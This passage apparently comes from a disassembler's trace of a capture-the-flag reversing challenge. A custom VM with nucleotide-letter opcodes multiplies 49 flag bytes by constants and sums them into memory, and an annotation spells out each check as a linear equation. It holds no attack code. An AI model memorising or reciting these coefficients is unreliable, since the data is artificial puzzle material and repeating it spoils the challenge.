pop())\n0a1f8 : TC               push(pop() + pop())\n0a1fa : TC               push(pop() + pop())\n0a1fc : TC               push(pop() + pop())\n0a1fe : TC               push(pop() + pop())\n0a200 : TC               push(pop() + pop())\n0a202 : TC               push(pop() + pop())\n0a204 : ATTCACTTCTTT     mem[#1074] := pop()           memory[#01074] := ((flag[0] * 178) + ((flag[1] * 247) + ((flag[2] * 234) + ((flag[3] * 21) + ((flag[4] * 251) + ((flag[5] * 76) + ((flag[6] * 5) + ((flag[7] * 175) + ((flag[8] * 105) + ((flag[9] * 22) + ((flag[10] * 51) + ((flag[11] * 139) + ((flag[12] * 244) + ((flag[13] * 146) + ((flag[14] * 22) + ((flag[15] * 202) + ((flag[16] * 54) + ((flag[17] * 65) + ((flag[18] * 76) + ((flag[19] * 43) + ((flag[20] * 205) + ((flag[21] * 86) + ((flag[22] * 158) + ((flag[23] * 124) + ((flag[24] * 71) + ((flag[25] * 178) + ((flag[26] * 67) + ((flag[27] * 2) + ((flag[28] * 64) + ((flag[29] * 121) + ((flag[30] * 13) + ((flag[31] * 76) + ((flag[32] * 108) + ((flag[33] * 29) + ((flag[34] * 193) + ((flag[35] * 114) + ((flag[36] * 48) + ((flag[37] * 103) + ((flag[38] * 219) + ((flag[39] * 111) + ((flag[40] * 131) + ((flag[41] * 122) + ((flag[42] * 124) + ((flag[43] * 167) + ((flag[44] * 83) + ((flag[45] * 217) + ((flag[46] * 11) + ((flag[47] * 110) + (flag[48] * 232)))))))))))))))))))))))))))))))))))))))))))))))))\n0a210 : GTTTTGGTTTTT     push(mem[#0280])\n0a21c : TTATTGTTTTTT     push(#00000083)\n0a228 : GC               push(pop() * pop())\n0a22a : GTCTTGGTTTTT     push(mem[#0281])\n0a236 : TTAGGATTTTTT     push(#000000eb)\n0a242 : GC               push(pop() * pop())\n0a244 : GTGTTGGTTTTT     push(mem[#0282])\n0a250 : TTCCCATTTTTT     push(#000000d5)\n0a25c : GC               push(pop() * pop())\n0a25e : GTATTGGTTTTT     push(mem[#0283])\n0a26a : TTGATCTTTTTT     push(#0000004e)\n0a276 : GC               push(pop() * pop())\n0a278 : GTTCTGGTTTTT     push(mem[#0284])\n0a284 : TTATGATTTTTT     push(#000000e3)\n0a290 : GC               push(pop() * pop())\n0a292 : GTCCTGGTTTTT     push(mem[#0285])\n0a29e : TTAAACTTTTTT     push(#0000007f)\n0a2aa : GC               push(pop() * pop())\n0a2ac : GTGCTGGTTTTT     push(mem[#0286])\n0a2b8 : TTTCATTTTTTT     push(#00000034)\n0a2c4 : GC               push(pop() * pop())\n0a2c6 : GTACTGGTTTTT     push(mem[#0287])\n0a2d2 : TTATGGTTTTTT     push(#000000a3)\n0a2de : GC               push(pop() * pop())\n0a2e0 : GTTGTGGTTTTT     push(mem[#0288])\n0a2ec : TTGAATTTTTTT     push(#0000003e)\n0a2f8 : GC               push(pop() * pop())\n0a2fa : GTCGTGGTTTTT     push(mem[#0289])\n0a306 : TTGGGATTTTTT     push(#000000ea)\n0a312 : GC               push(pop() * pop())\n0a314 : GTGGTGGTTTTT     push(mem[#028a])\n0a320 : TTAGTATTTTTT     push(#000000cb)\n0a32c : GC               push(pop() * pop())\n0a32e : GTAGTGGTTTTT     push(mem[#028b])\n0a33a : TTGAGGTTTTTT     push(#000000ae)\n0a346 : GC               push(pop() * pop())\n0a348 : GTTATGGTTTTT     push(mem[#028c])\n0a354 : TTCGTCTTTTTT     push(#00000049)\n0a360 : GC               push(pop() * pop())\n0a362 : GTCATGGTTTTT     push(mem[#028d])\n0a36e : TTTATTTTTTTT     push(#0000000c)\n0a37a : GC               push(pop() * pop())\n0a37c : GTGATGGTTTTT     push(mem[#028e])\n0a388 : TTCAATTTTTTT     push(#0000003d)\n0a394 : GC               push(pop() * pop())\n0a396 : GTAATGGTTTTT     push(mem[#028f])\n0a3a2 : TTTTCATTTTTT     push(#000000d0)\n0a3ae : GC               push(pop() * pop())\n0a3b0 : GTTTCGGTTTTT     push(mem[#0290])\n0a3bc : TTACGGTTTTTT     push(#000000a7)\n0a3c8 : GC               push(pop() * pop())\n0a3ca : GTCTCGGTTTTT     push(mem[#0291])\n0a3d6 : TTGCCATTTTTT     push(#000000d6)\n0a3e2 : GC               push(pop() * pop())\n0a3e4 : GTGTCGGTTTTT     push(mem[#0292])\n0a3f0 : TTTCTTTTTTTT     push(#00000004)\n0a3fc : GC               push(pop() * pop())\n0a3fe : GTATCGGTTTTT     push(mem[#0293])\n0a40a : TTTCTGTTTTTT     push(#00000084)\n0a416 : GC               push(pop() * pop())\n0a418 : GTTCCGGTTTTT     push(mem[#0294])\n0a424 : TTTGCGTTTTTT     push(#00000098)\n0a430 : GC               push(pop() * pop())\n0a432 : GTCCCGGTTTTT     push(mem[#0295])\n0a43e : TTAACTTTTTTT     push(#0000001f)\n0a44a : GC               push(pop() * pop())\n0a44c : GTGCCGGTTTTT     push(mem[#0296])\n0a458 : TTATACTTTTTT     push(#00000073)\n0a464 : GC               push(pop() * pop())\n0a466 : GTACCGGTTTTT     push(mem[#0297])\n0a472 : TTATCATTTTTT     push(#000000d3)\n0a47e : GC               push(pop() * pop())\n0a480 : GTTGCGGTTTTT     push(mem[#0298])\n0a48c : TTCAAGTTTTTT     push(#000000bd)\n0a498 : GC               push(pop() * pop())\n0a49a : GTCGCGGTTTTT     push(mem[#0299])\n0a4a6 : TTGACGTTTTTT     push(#0000009e)\n0a4b2 : GC               push(pop() * pop())\n0a4b4 : GTGGCGGTTTTT     push(mem[#029a])\n0a4c0 : TTCGTATTTTTT     push(#000000c9)\n0a4cc : GC               push(pop() * pop())\n0a4ce : GTAGCGGTTTTT     push(mem[#029b])\n0a4da : TTACCCTTTTTT     push(#00000057)\n0a4e6 : GC               push(pop() * pop())\n0a4e8 : GTTACGGTTTTT     push(mem[#029c])\n0a4f4 : TTCGACTTTTTT     push(#00000079)\n0a500 : GC               push(pop() * pop())\n0a502 : GTCACGGTTTTT     push(mem[#029d])\n0a50e : TTTCGATTTTTT     push(#000000e4)\n0a51a : GC               push(pop() * pop())\n0a51c : GTGACGGTTTTT     push(mem[#029e])\n0a528 : TTGCAATTTTTT     push(#000000f6)\n0a534 : GC               push(pop() * pop())\n0a536 : GTAACGGTTTTT     push(mem[#029f])\n0a542 : TTAATTTTTTTT     push(#0000000f)\n0a54e : GC               push(pop() * pop())\n0a550 : GTTTGGGTTTTT     push(mem[#02a0])\n0a55c : TTTAGATTTTTT     push(#000000ec)\n0a568 : GC               push(pop() * pop())\n0a56a : GTCTGGGTTTTT     push(mem[#02a1])\n0a576 : TTCGTTTTTTTT     push(#00000009)\n0a582 : GC               push(pop() * pop())\n0a584 : GTGTGGGTTTTT     push(mem[#02a2])\n0a590 : TTTTGCTTTTTT     push(#00000060)\n0a59c : GC               push(pop() * pop())\n0a59e : GTATGGGTTTTT     push(mem[#02a3])\n0a5aa : TTGACATTTTTT     push(#000000de)\n0a5b6 : GC               push(pop() * pop())\n0a5b8 : GTTCGGGTTTTT     push(mem[#02a4])\n0a5c4 : TTTTACTTTTTT     push(#00000070)\n0a5d0 : GC               push(pop() * pop())\n0a5d2 : GTCCGGGTTTTT     push(mem[#02a5])\n0a5de : TTTAGCTTTTTT     push(#0000006c)\n0a5ea : GC               push(pop() * pop())\n0a5ec : GTGCGGGTTTTT     push(mem[#02a6])\n0a5f8 : TTTGGCTTTTTT     push(#00000068)\n0a604 : GC               push(pop() * pop())\n0a606 : GTACGGGTTTTT     push(mem[#02a7])\n0a612 : TTAGTGTTTTTT     push(#0000008b)\n0a61e : GC               push(pop() * pop())\n0a620 : GTTGGGGTTTTT     push(mem[#02a8])\n0a62c : TTCGCCTTTTTT     push(#00000059)\n0a638 : GC               push(pop() * pop())\n0a63a : GTCGGGGTTTTT     push(mem[#02a9])\n0a646 : TTTGATTTTTTT     push(#00000038)\n0a652 : GC               push(pop() * pop())\n0a654 : GTGGGGGTTTTT     push(mem[#02aa])\n0a660 : TTTTATTTTTTT     push(#00000030)\n0a66c : GC               push(pop() * pop())\n0a66e : GTAGGGGTTTTT     push(mem[#02ab])\n0a67a : TTTCTGTTTTTT     push(#00000084)\n0a686 : GC               push(pop() * pop())\n0a688 : GTTAGGGTTTTT     push(mem[#02ac])\n0a694 : TTAAGCTTTTTT     push(#0000006f)\n0a6a0 : GC               push(pop() * pop())\n0a6a2 : GTCAGGGTTTTT     push(mem[#02ad])\n0a6ae : TTTCCTTTTTTT     push(#00000014)\n0a6ba : GC               push(pop() * pop())\n0a6bc : GTGAGGGTTTTT     push(mem[#02ae])\n0a6c8 : TTACTTTTTTTT     push(#00000007)\n0a6d4 : GC               push(pop() * pop())\n0a6d6 : GTAAGGGTTTTT     push(mem[#02af])\n0a6e2 : TTTGTCTTTTTT     push(#00000048)\n0a6ee : GC               push(pop() * pop())\n0a6f0 : GTTTAGGTTTTT     push(mem[#02b0])\n0a6fc : TTGAGGTTTTTT     push(#000000ae)\n0a708 : GC               push(pop() * pop())\n0a70a : TC               push(pop() + pop())\n0a70c : TC               push(pop() + pop())\n0a70e : TC               push(pop() + pop())\n0a710 : TC               push(pop() + pop())\n0a712 : TC               push(pop() + pop())\n0a714 : TC               push(pop() + pop())\n0a716 : TC               push(pop() + pop())\n0a718 : TC               push(pop() + pop())\n0a71a : TC               push(pop() + pop())\n0a71c : TC               push(pop() + pop())\n0a71e : TC               push(pop() + pop())\n0a720 : TC               push(pop() + pop())\n0a722 : TC               push(pop() + pop())\n0a724 : TC               push(pop() + pop())\n0a726 : TC               push(pop() + pop())\n0a728 : TC               push(pop() + pop())\n0a72a : TC               push(pop() + pop())\n0a72c : TC               push(pop() + pop())\n0a72e : TC               push(pop() + pop())\n0a730 : TC               push(pop() + pop())\n0a732 : TC               push(pop() + pop())\n0a734 : TC               push(pop() + pop())\n0a736 : TC               push(pop() + pop())\n0a738 : TC               push(pop() + pop())\n0a73a : TC               push(pop() + pop())\n0a73c : TC               push(pop() + pop())\n0a73e : TC               push(pop() + pop())\n0a740 : TC               push(pop() + pop())\n0a742 : TC               push(pop() + pop())\n0a744 : TC               push(pop() + pop())\n0a746 : TC               push(pop() + pop())\n0a748 : TC               push(pop() + pop())\n0a74a : TC               push(pop() + pop())\n0a74c : TC               push(pop() + pop())\n0a74e : TC               push(pop() + pop())\n0a750 : TC               push(pop() + pop())\n0a752 : TC               push(pop() + pop())\n0a754 : TC               push(pop() + pop())\n0a756 : TC               push(pop() + pop())\n0a758 : TC               push(pop() + pop())\n0a75a : TC               push(pop() + pop())\n0a75c : TC               push(pop() + pop())\n0a75e : TC               push(pop() + pop())\n0a760 : TC               push(pop() + pop())\n0a762 : TC               push(pop() + pop())\n0a764 : TC               push(pop() + pop())\n0a766 : TC               push(pop() + pop())\n0a768 : TC               push(pop() + pop())\n0a76a : ATTGACTTCTTT     mem[#1078] := pop()           memory[#01078] := ((flag[0] * 131) + ((flag[1] * 235) + ((flag[2] * 213) + ((flag[3] * 78) + ((flag[4] * 227) + ((flag[5] * 127) + ((flag[6] * 52) + ((flag[7] * 163) + ((flag[8] * 62) + ((flag[9] * 234) + ((flag[10] * 203) + ((flag[11] * 174) + ((flag[12] * 73) + ((flag[13] * 12) + ((flag[14] * 61) + ((flag[15] * 208) + ((flag[16] * 167) + ((flag[17] * 214) + ((flag[18] * 4) + ((flag[19] * 132) + ((flag[20] * 152) + ((flag[21] * 31) + ((flag[22] * 115) + ((flag[23] * 211) + ((flag[24] * 189) + ((flag[25] * 158) + ((flag[26] * 201) + ((flag[27] * 87) + ((flag[28] * 121) + ((flag[29] * 228) + ((flag[30] * 246) + ((flag[31] * 15) + ((flag[32] * 236) + ((flag[33] * 9) + ((flag[34] * 96) + ((flag[35] * 222) + ((flag[36] * 112) + ((flag[37] * 108) + ((flag[38] * 104) + ((flag[39] * 139) + ((flag[40] * 89) + ((flag[41] * 56) + ((flag[42] * 48) + ((flag[43] * 132) + ((flag[44] * 111) + ((flag[45] * 20) + ((flag[46] * 7) + ((flag[47] * 72) + (flag[48] * 174)))))))))))))))))))))))))))))))))))))))))))))))))\n0a776 : GTTTTGGTTTTT     push(mem[#0280])\n0a782 : TTAGGATTTTTT     push(#000000eb)\n0a78e : GC               push(pop() * pop())\n0a790 : GTCTTGGTTTTT     push(mem[#0281])\n0a79c : TTGTGTTTTTTT     push(#00000022)\n0a7a8 : GC               push(pop() * pop())\n0a7aa : GTGTTGGTTTTT     push(mem[#0282])\n0a7b6 : TTGGAATTTTTT     push(#000000fa)\n0a7c2 : GC               push(pop() * pop())\n0a7c4 : GTATTGGTTTTT     push(mem[#0283])\n0a7d0 : TTCAGGTTTTTT     push(#000000ad)\n0a7dc : GC               push(pop() * pop())\n0a7de : GTTCTGGTTTTT     push(mem[#0284])\n0a7ea : TTATAGTTTTTT     push(#000000b3)\n0a7f6 : GC               push(pop() * pop())\n0a7f8 : GTCCTGGTTTTT     push(mem[#0285])\n0a804 : TTTAAGTTTTTT     push(#000000bc)\n0a810 : GC               push(pop() * pop())\n0a812 : GTGCTGGTTTTT     push(mem[#0286])\n0a81e : TTGGCATTTTTT     push(#000000da)\n0a82a : GC               push(pop() * pop())\n0a82c : GTACTGGTTTTT     push(mem[#0287])\n0a838 : TTAGACTTTTTT     push(#0000007b)\n0a844 : GC               push(pop() * pop())\n0a846 : GTTGTGGTTTTT     push(mem[#0288])\n0a852 : TTGACTTTTTTT     push(#0000001e)\n0a85e : GC               push(pop() * pop())\n0a860 : GTCGTGGTTTTT     push(mem[#0289])\n0a86c : TTGTGATTTTTT     push(#000000e2)\n0a878 : GC               push(pop() * pop())\n0a87a : GTGGTGGTTTTT     push(mem[#028a])\n0a886 : TTTGGTTTTTTT     push(#00000028)\n0a892 : GC               push(pop() * pop())\n0a894 : GTAGTGGTTTTT     push(mem[#028b])\n0a8a0 : TTTCGATTTTTT     push(#000000e4)\n0a8ac : GC               push(pop() * pop())\n0a8ae : GTTATGGTTTTT     push(mem[#028c])\n0a8ba : TTAATATTTTTT     push(#000000cf)\n0a8c6 : GC               push(pop() * pop())\n0a8c8 : GTCATGGTTTTT     push(mem[#028d])\n0a8d4 : TTCTCTTTTTTT     push(#00000011)\n0a8e0 : GC               push(pop() * pop())\n0a8e2 : GTGATGGTTTTT     push(mem[#028e])\n0a8ee : TTCATGTTTTTT     push(#0000008d)\n0a8fa : GC               push(pop() * pop())\n0a8fc : GTAATGGTTTTT     push(mem[#028f])\n0a908 : TTCCCTTTTTTT     push(#00000015)\n0a914 : GC               push(pop() * pop())\n0a916 : GTTTCGGTTTTT     push(mem[#0290])\n0a922 : TTTAGGTTTTTT     push(#000000ac)\n0a92e : GC               push(pop() * pop())\n0a930 : GTCTCGGTTTTT     push(mem[#0291])\n0a93c : TTTTTGTTTTTT     push(#00000080)\n0a948 : GC               push(pop() * pop())\n0a94a : GTGTCGGTTTTT     push(mem[#0292])\n0a956 : TTACCTTTTTTT     push(#00000017)\n0a962 : GC               push(pop() * pop())\n0a964 : GTATCGGTTTTT     push(mem[#0293])\n0a970 : TTGGCTTTTTTT     push(#0000001a)\n0a97c : GC               push(pop() * pop())\n0a97e : GTTCCGGTTTTT     push(mem[#0294])\n0a98a : TTCCACTTTTTT     push(#00000075)\n0a996 : GC               push(pop() * pop())\n0a998 : GTCCCGGTTTTT     push(mem[#0295])\n0a9a4 : TTAAGGTTTTTT     push(#000000af)\n0a9b0 : GC               push(pop() * pop())\n0a9b2 : GTGCCGGTTTTT     push(mem[#0296])\n0a9be : TTTTTGTTTTTT     push(#00000080)\n0a9ca : GC               push(pop() * pop())\n0a9cc : GTACCGGTTTTT     push(mem[#0297])\n0a9d8 : TTGGTATTTTTT     push(#000000ca)\n0a9e4 : GC               push(pop() * pop())\n0a9e6 : GTTGCGGTTTTT     push(mem[#0298])\n0a9f2 : TTTAGTTTTTTT     push(#0000002c)\n0a9fe : GC               push(pop() * pop())\n0aa00 : GTCGCGGTTTTT     push(mem[#0299])\n0aa0c : TTAAGATTTTTT     push(#000000ef)\n0aa18 : GC               push(pop() * pop())\n0aa1a : GTGGCGGTTTTT     push(mem[#029a])\n0aa26 : TTCTGGTTTTTT     push(#000000a1)\n0aa32 : GC               push(pop() * pop())\n0aa34 : GTAGCGGTTTTT     push(mem[#029b])\n0aa40 : TTGCGGTTTTTT     push(#000000a6)\n0aa4c : GC               push(pop() * pop())\n0aa4e : GTTACGGTTTTT     push(mem[#029c])\n0aa5a : TTCAAATTTTTT     push(#000000fd)\n0aa66 : GC               push(pop() * pop())\n0aa68 : GTCACGGTTTTT     push(mem[#029d])\n0aa74 : TTAAAGTTTTTT     push(#000000bf)\n0aa80 : GC               push(pop() * pop())\n0aa82 : GTGACGGTTTTT     push(mem[#029e])\n0aa8e : TTAGGCTTTTTT     push(#0000006b)\n0aa9a : GC               push(pop() * pop())\n0aa9c : GTAACGGTTTTT     push(mem[#029f])\n0aaa8 : TTACAGTTTTTT     push(#000000b7)\n0aab4 : GC               push(pop() * pop())\n0aab6 : GTTTGGGTTTTT     push(mem[#02a0])\n0aac2 : TTGGTGTTTTTT     push(#0000008a)\n0aace : GC               push(pop() * pop())\n0aad0 : GTCTGGGTTTTT     push(mem[#02a1])\n0aadc : TTAAACTTTTTT     push(#0000007f)\n0aae8 : GC               push(pop() * pop())\n0aaea : GTGTGGGTTTTT     push(mem[#02a2])\n0aaf6 : TTCCCATTTTTT     push(#000000d5)\n0ab02 : GC               push(pop() * pop())\n0ab04 : GTATGGGTTTTT     push(mem[#02a3])\n0ab10 : TTGTATTTTTTT     push(#00000032)\n0ab1c : GC               push(pop() * pop())\n0ab1e : GTTCGGGTTTTT     push(mem[#02a4])\n0ab2a : TTCCTGTTTTTT     push(#00000085)\n0ab36 : GC               push(pop() * pop())\n0ab38 : GTCCGGGTTTTT     push(mem[#02a5])\n0ab44 : TTAGTCTTTTTT     push(#0000004b)\n0ab50 : GC               push(pop() * pop())\n0ab52 : GTGCGGGTTTTT     push(mem[#02a6])\n0ab5e : TTTGAGTTTTTT     push(#000000b8)\n0ab6a : GC               push(pop() * pop())\n0ab6c : GTACGGGTTTTT     push(mem[#02a7])\n0ab78 : TTACTATTTTTT     push(#000000c7)\n0ab84 : GC               push(pop() * pop())\n0ab86 : GTTGGGGTTTTT     push(mem[#02a8])\n0ab92 : TTACTATTTTTT     push(#000000c7)\n0ab9e : GC               push(pop() * pop())\n0aba0 : GTCGGGGTTTTT     push(mem[#02a9])\n0abac : TTAAAATTTTTT     push(#000000ff)\n0abb8 : GC               push(pop() * pop())\n0abba : GTGGGGGTTTTT     push(mem[#02aa])\n0abc6 : TTATTCTTTTTT     push(#00000043)\n0abd2 : GC               push(pop() * pop())\n0abd4 : GTAGGGGTTTTT     push(mem[#02ab])\n0abe0 : TTTCAGTTTTTT     push(#000000b4)\n0abec : GC               push(pop() * pop())\n0abee : GTTAGGGTTTTT     push(mem[#02ac])\n0abfa : TTAACGTTTTTT     push(#0000009f)\n0ac06 : GC               push(pop() * pop())\n0ac08 : GTCAGGGTTTTT     push(mem[#02ad])\n0ac14 : TTTGCGTTTTTT     push(#00000098)\n0ac20 : GC               push(pop() * pop())\n0ac22 : GTGAGGGTTTTT     push(mem[#02ae])\n0ac2e : TTTGGATTTTTT     push(#000000e8)\n0ac3a : GC               push(pop() * pop())\n0ac3c : GTAAGGGTTTTT     push(mem[#02af])\n0ac48 : TTTCCCTTTTTT     push(#00000054)\n0ac54 : GC               push(pop() * pop())\n0ac56 : GTTTAGGTTTTT     push(mem[#02b0])\n0ac62 : TTAAGATTTTTT     push(#000000ef)\n0ac6e : GC               push(pop() * pop())\n0ac70 : TC               push(pop() + pop())\n0ac72 : TC               push(pop() + pop())\n0ac74 : TC               push(pop() + pop())\n0ac76 : TC               push(pop() + pop())\n0ac78 : TC               push(pop() + pop())\n0ac7a : TC               push(pop() + pop())\n0ac7c : TC               push(pop() + pop())\n0ac7e : TC               push(pop() + pop())\n0ac80 : TC               push(pop() + pop())\n0ac82 : TC               push(pop() + pop())\n0ac84 : TC               push(pop() + pop())\n0ac86 : TC               push(pop() + pop())\n0ac88 : TC               push(pop() + pop())\n0ac8a : TC               push(pop() + pop())\n0ac8c : TC               push(pop() + pop())\n0ac8e : TC               push(pop() + pop())\n0ac90 : TC               push(pop() + pop())\n0ac92 : TC               push(pop() + pop())\n0ac94 : TC               push(pop() + pop())\n0ac96 : TC               push(pop() + pop())\n0ac98 : TC               push(pop() + pop())\n0ac9a : TC               push(pop() + pop())\n0ac9c : TC               push(pop() + pop())\n0ac9e : TC               push(pop() + pop())\n0aca0 : TC               push(pop() + pop())\n0aca2 : TC               push(pop() + pop())\n0aca4 : TC               push(pop() + pop())\n0aca6 : TC               push(pop() + pop())\n0aca8 : TC               push(pop() + pop())\n0acaa : TC               push(pop() + pop())\n0acac : TC               push(pop() + pop())\n0acae : TC               push(pop() + pop())\n0acb0 : TC               push(pop() + pop())\n0acb2 : TC               push(pop() + pop())\n0acb4 : TC               push(pop() + pop())\n0acb6 : TC               push(pop() + pop())\n0acb8 : TC               push(pop() + pop())\n0acba : TC               push(pop() + pop())\n0acbc : TC               push(pop() + pop())\n0acbe : TC               push(pop() + pop())\n0acc0 : TC               push(pop() + pop())\n0acc2 : TC               push(pop() + pop())\n0acc4 : TC               push(pop() + pop())\n0acc6 : TC               push(pop() + pop())\n0acc8 : TC               push(pop() + pop())\n0acca : TC               push(pop() + pop())\n0accc : TC               push(pop() + pop())\n0acce : TC               push(pop() + pop())\n0acd0 : ATTAACTTCTTT     mem[#107c] := pop()           memory[#0107c] := ((flag[0] * 235) + ((flag[1] * 34) + ((flag[2] * 250) + ((flag[3] * 173) + ((flag[4] * 179) + ((flag[5] * 188) + ((flag[6] * 218) + ((flag[7] * 123) + ((flag[8] * 30) + ((flag[9] * 226) + ((flag[10] * 40) + ((flag[11] * 228) + ((flag[12] * 207) + ((flag[13] * 17) + ((flag[14] * 141) + ((flag[15] * 21) + ((flag[16] * 172) + ((flag[17] * 128) + ((flag[18] * 23) + ((flag[19] * 26) + ((flag[20] * 117) + ((flag[21] * 175) + ((flag[22] * 128) + ((flag[23] * 202) + ((flag[24] * 44) + ((flag[25] * 239) + ((flag[26] * 161) + ((flag[27] * 166) + ((flag[28] * 253) + ((flag[29] * 191) + ((flag[30] * 107) + ((flag[31] * 183) + ((flag[32] * 138) + ((flag[33] * 127) + ((flag[34] * 213) + ((flag[35] * 50) + ((flag[36] * 133) + ((flag[37] * 75) + ((flag[38] * 184) + ((flag[39] * 199) + ((flag[40] * 199) + ((flag[41] * 255) + ((flag[42] * 67) + ((flag[43] * 180) + ((flag[44] * 159) + ((flag[45] * 152) + ((flag[46] * 232) + ((flag[47] * 84) + (flag[48] * 239)))))))))))))))))))))))))))))))))))))))))))))))))\n0acdc : GTTTTGGTTTTT     push(mem[#0280])\n0ace8 : TTAGCGTTTTTT     push(#0000009b)\n0acf4 : GC               push(pop() * pop())\n0acf6 : GTCTTGGTTTTT     push(mem[#0281])\n0ad02 : TTCAATTTTTTT     push(#0000003d)\n0ad0e : GC               push(pop() * pop())\n0ad10 : GTGTTGGTTTTT     push(mem[#0282])\n0ad1c : TTGGCGTTTTTT     push(#0000009a)\n0ad28 : GC               push(pop() * pop())\n0ad2a : GTATTGGTTTTT     push(mem[#0283])\n0ad36 : TTGTGGTTTTTT     push(#000000a2)\n0ad42 : GC               push(pop() * pop())\n0ad44 : GTTCTGGTTTTT     push(mem[#0284])\n0ad50 : TTATATTTTTTT     push(#00000033)\n0ad5c : GC               push(pop() * pop())\n0ad5e : GTCCTGGTTTTT     push(mem[#0285])\n0ad6a : TTCCCCTTTTTT     push(#00000055)\n0ad76 : GC               push(pop() * pop())\n0ad78 : GTGCTGGTTTTT     push(mem[#0286])\n0ad84 : TTTATATTTTTT     push(#000000cc)\n0ad90 : GC               push(pop() * pop())\n0ad92 : GTACTGGTTTTT     push(mem[#0287])\n0ad9e : TTTGCATTTTTT     push(#000000d8)\n0adaa : GC               push(pop() * pop())\n0adac : GTTGTGGTTTTT     push(mem[#0288])\n0adb8 : TTACCTTTTTTT     push(#00000017)\n0adc4 : GC               push(pop() * pop())\n0adc6 : GTCGTGGTTTTT     push(mem[#0289])\n0add2 : TTCAACTTTTTT     push(#0000007d)\n0adde : GC               push(pop() * pop())\n0ade0 : GTGGTGGTTTTT     push(mem[#028a])\n0adec : TTACCGTTTTTT     push(#00000097)\n0adf8 : GC               push(pop() * pop())\n0adfa : GTAGTGGTTTTT     push(mem[#028b])\n0ae06 : TTAGAATTTTTT     push(#000000fb)\n0ae12 : GC               push(pop() * pop())\n0ae14 : GTTATGGTTTTT     push(mem[#028c])\n0ae20 : TTTCACTTTTTT     push(#00000074)\n0ae2c : GC               push(pop() * pop())\n0ae2e : GTCATGGTTTTT     push(mem[#028d])\n0ae3a : TTAGTGTTTTTT     push(#0000008b)\n0ae46 : GC               push(pop() * pop())\n0ae48 : GTGATGGTTTTT     push(mem[#028e])\n0ae54 : TTTCTATTTTTT     push(#000000c4)\n0ae60 : GC               push(pop() * pop())\n0ae62 : GTAATGGTTTTT     push(mem[#028f])\n0ae6e : TTACGATTTTTT     push(#000000e7)\n0ae7a : GC               push(pop() * pop())\n0ae7c : GTTTCGGTTTTT     push(mem[#0290])\n0ae88 : TTTCAGTTTTTT     push(#000000b4)\n0ae94 : GC               push(pop() * pop())\n0ae96 : GTCTCGGTTTTT     push(mem[#0291])\n0aea2 : TTGCATTTTTTT     push(#00000036)\n0aeae : GC               push(pop() * pop())\n0aeb0 : GTGTCGGTTTTT     push(mem[#0292])\n0aebc : TTTGCTTTTTTT     push(#00000018)\n0aec8 : GC               push(pop() * pop())\n0aeca : GTATCGGTTTTT     push(mem[#0293])\n0aed6 : TTAAGCTTTTTT     push(#0000006f)\n0aee2 : GC               push(pop() * pop())\n0aee4 : GTTCCGGTTTTT     push(mem[#0294])\n0aef0 : TTCATTTTTTTT     push(#0000000d)\n0aefc : GC               push(pop() * pop())\n0aefe : GTCCCGGTTTTT     push(mem[#0295])\n0af0a : TTGGCCTTTTTT     push(#0000005a)\n0af16 : GC               push(pop() * pop())\n0af18 : GTGCCGGTTTTT     push(mem[#0296])\n0af24 : TTGACGTTTTTT     push(#0000009e)\n0af30 : GC               push(pop() * pop())\n0af32 : GTACCGGTTTTT     push(mem[#0297])\n0af3e : TTCAATTTTTTT     push(#0000003d)\n0af4a : GC               push(pop() * pop())\n0af4c : GTTGCGGTTTTT     push(mem[#0298])\n0af58 : TTGCACTTTTTT     push(#00000076)\n0af64 : GC               push(pop() * pop())\n0af66 : GTCGCGGTTTTT     push(mem[#0299])\n0af72 : TTCCTGTTTTTT     push(#00000085)\n0af7e : GC               push(pop() * pop())\n0af80 : GTGGCGGTTTTT     push(mem[#029a])\n0af8c : TTGCCGTTTTTT     push(#00000096)\n0af98 : GC               push(pop() * pop())\n0af9a : GTAGCGGTTTTT     push(mem[#029b])\n0afa6 : TTTCGATTTTTT     push(#000000e4)\n0afb2 : GC               push(pop() * pop())\n0afb4 : GTTACGGTTTTT     push(mem[#029c])\n0afc0 : TTATTATTTTTT     push(#000000c3)\n0afcc : GC               push(pop() * pop())\n0afce : GTCACGGTTTTT     push(mem[#029d])\n0afda : TTGCGTTTTTTT     push(#00000026)\n0afe6 : GC               push(pop() * pop())\n0afe8 : GTGACGGTTTTT     push(mem[#029e])\n0aff4 : TTCGACTTTTTT     push(#00000079)\n0b000 : GC               push(pop() * pop())\n0b002 : GTAACGGTTTTT     push(mem[#029f])\n0b00e : TTTTGATTTTTT     push(#000000e0)\n0b01a : GC               push(pop() * pop())\n0b01c : GTTTGGGTTTTT     push(mem[#02a0])\n0b028 : TTTACGTTTTTT     push(#0000009c)\n0b034 : GC               push(pop() * pop())\n0b036 : GTCTGGGTTTTT     push(mem[#02a1])\n0b042 : TTATAGTTTTTT     push(#000000b3)\n0b04e : GC               push(pop() * pop())\n0b050 : GTGTGGGTTTTT     push(mem[#02a2])\n0b05c : TTGTGGTTTTTT     push(#000000a2)\n0b068 : GC               push(pop() * pop())\n0b06a : GTATGGGTTTTT     push(mem[#02a3])\n0b076 : TTTTTTTTTTTT     push(#00000000)\n0b082 : GC               push(pop() * pop())\n0b084 : GTTCGGGTTTTT     push(mem[#02a4])\n0b090 : TTCTAATTTTTT     push(#000000f1)\n0b09c : GC               push(pop() * pop())\n0b09e : GTCCGGGTTTTT     push(mem[#02a5])\n0b0aa : TTAGCCTTTTTT     push(#0000005b)\n0b0b6 : GC               push(pop() * pop())\n0b0b8 : GTGCGGGTTTTT     push(mem[#02a6])\n0b0c4 : TTGCGTTTTTTT     push(#00000026)\n0b0d0 : GC               push(pop() * pop())\n0b0d2 : GTACGGGTTTTT     push(mem[#02a7])\n0b0de : TTGTGGTTTTTT     push(#000000a2)\n0b0ea : GC               push(pop() * pop())\n0b0ec : GTTGGGGTTTTT     push(mem[#02a8])\n0b0f8 : TTATACTTTTTT     push(#00000073)\n0b104 : GC               push(pop() * pop())\n0b106 : GTCGGGGTTTTT     push(mem[#02a9])\n0b112 : TTAAATTTTTTT     push(#0000003f)\n0b11e : GC               push(pop() * pop())\n0b120 : GTGGGGGTTTTT     push(mem[#02aa])\n0b12c : TTTAAGTTTTTT     push(#000000bc)\n0b138 : GC               push(pop() * pop())\n0b13a : GTAGGGGTTTTT     push(mem[#02ab])\n0b146 : TTTCTATTTTTT     push(#000000c4)\n0b152 : GC               push(pop() * pop())\n0b154 : GTTAGGGTTTTT     push(mem[#02ac])\n0b160 : TTGCTCTTTTTT     push(#00000046)\n0b16c : GC               push(pop() * pop())\n0b16e : GTCAGGGTTTTT     push(mem[#02ad])\n0b17a : TTAAGATTTTTT     push(#000000ef)\n0b186 : GC               push(pop() * 